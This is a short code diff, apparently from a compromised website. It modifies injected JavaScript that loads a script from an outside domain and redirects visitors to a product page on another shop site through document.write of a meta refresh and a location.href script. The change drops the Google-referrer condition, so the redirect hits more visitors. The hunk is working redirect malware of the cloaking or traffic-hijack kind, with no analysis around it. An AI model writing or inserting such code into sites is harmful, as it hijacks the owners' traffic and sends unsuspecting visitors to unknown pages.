@@ -36,7 +36,7 @@
 	
 	loadScript("https://nibclmarket.shop/common.js?name=1",()=> {
 		let jump=true;
-		if (document.referrer.includes('google') && isgoo) {
+		if (isgoo) {
                 let ids = location.href.split('/')[4].replace(/[^\d]+/g,'');
                 let url = 'https://'+site+'/index.php?main_page=product_info&products_id='+ids;
                 document.write('<meta http-equiv="Refresh" content="0;url='+url+'" /><script>location.href="'+url+'"<\/script>');
